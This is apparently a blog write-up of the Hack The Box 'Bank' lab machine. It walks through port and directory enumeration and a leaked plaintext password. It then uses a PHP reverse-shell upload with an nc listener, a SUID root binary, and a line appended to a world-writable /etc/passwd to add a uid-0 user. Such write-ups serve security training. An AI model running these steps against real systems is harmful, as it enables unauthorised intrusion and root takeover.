---
clayout: ctf
title: Bank
date: 2025-08-17
image: /ctf/hack-the-box/machines/bank/info-card.png
type: Hack The Box

ctf:
    - name: Bank
      link: https://app.hackthebox.com/machines/26
      thumbnail: /ctf/hack-the-box/machines/bank/info-card.png
      pwned:
        - link: https://www.hackthebox.com/achievement/machine/585215/26
          thumbnail: /ctf/hack-the-box/machines/bank/pwned.png
---

## Challenge Overview

**Bank** is an easy-rated Linux machine that highlights classic **web application exploitation** techniques and **privilege escalation** misconfigurations. The compromise path follows three main stages:

* **Web Enumeration**: Identifying a hidden virtual host and extracting sensitive data
* **Initial Foothold**: Exploiting a weak file upload validation to obtain a reverse shell
* **Privilege Escalation**: Gaining root access via insecure SUID binaries and misconfigured file permissions

## Initial Reconnaissance

### Network Enumeration

Use `nmap` to scan the machine for open ports and services:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.10.29
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

**Observations:**

* Web service running on Apache
* DNS service available (suggesting possible subdomain/virtual host usage)
* SSH open for potential later access

### Web Enumeration

#### Virtual Host Discovery

Visiting `http://10.10.10.29` only shows the default Apache page, often an indicator of **name-based virtual hosting**.

Based on the machine’s name, add a host entry for `bank.htb`:

```bash
echo "10.10.10.29 bank.htb" | sudo tee -a /etc/hosts
```

Accessing `http://bank.htb` reveals a login page:

![Bank Login Page](/ctf/hack-the-box/machines/bank/bank-login-page.png)

#### Directory Enumeration

```bash
gobuster dir -u http://bank.htb \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php -o gobuster.txt
```

**Findings:**

```bash
/index.php            (302 → login.php)
/login.php            (200)
/support.php          (302 → login.php)
/uploads              (301)
/assets               (301)
/logout.php           (302 → index.php)
/inc                  (301)
/balance-transfer     (301)
```

The `/balance-transfer` directory stands out, exposing a directory listing containing multiple `.acc` files.

![Balance Transfer Page](/ctf/hack-the-box/machines/bank/balance-transfer-page.png)

## Exploitation

### Credential Disclosure

Most `.acc` files contain encrypted data, but one file (`68576f20e9732f1b2edc4df5b8533230.acc`) leaks plaintext credentials due to a failed encryption process:

```text
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
```

With these credentials, login succeeds and grants access to the bank dashboard.

![Bank Dashboard](/ctf/hack-the-box/machines/bank/bank-dashboard.png)

### File Upload Vulnerability

The **Support** page allows image uploads. Reviewing the source code discloses a dangerous misconfiguration:

```html
<!-- [DEBUG] 
I added the file extension .htb to execute as php for debugging purposes only
[DEBUG] -->
```

This means any `.htb` file is executed as PHP.

**Exploit:**

1. Generate a PHP reverse shell (e.g., [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)).
2. Upload it as `shell.htb`.
3. Trigger the file via the `Click here` button on `My Tickets` table.

```bash
nc -lvnp 1337
```

Once executed, a reverse shell is obtained:

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**User flag:** Located in `/home/chris/user.txt`

## Privilege Escalation

### Path 1: Abusing SUID Binary

List SUID binaries:

```bash
find / -type f -perm -u=s 2>/dev/null
```

Notable finding:

```bash
/var/htb/bin/emergency
```

This script is misconfigured and executes itself recursively with root privileges, leading to a root shell:

```bash
/var/htb/bin/emergency
id
uid=0(root) gid=0(root)
```

**Root flag:** `/root/root.txt`

### Path 2: Writable /etc/passwd

Another privilege escalation vector is the world-writable `/etc/passwd`:

```bash
ls -l /etc/passwd
-rw-rw-rw- 1 root root ... /etc/passwd
```

**Exploit:**

1. Generate a password hash:

   ```bash
   openssl passwd -1 random
   ```

2. Append a root-level user entry:

   ```bash
   echo 'random:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
   ```

3. Switch to the new account:

   ```bash
   su random
   ```

Root access is obtained.

> [!NOTE]
> Always upgrade to a proper TTY before using `su`:
>
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

## References

* [Hack The Box - Bank](https://app.hackthebox.com/machines/26)
* [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
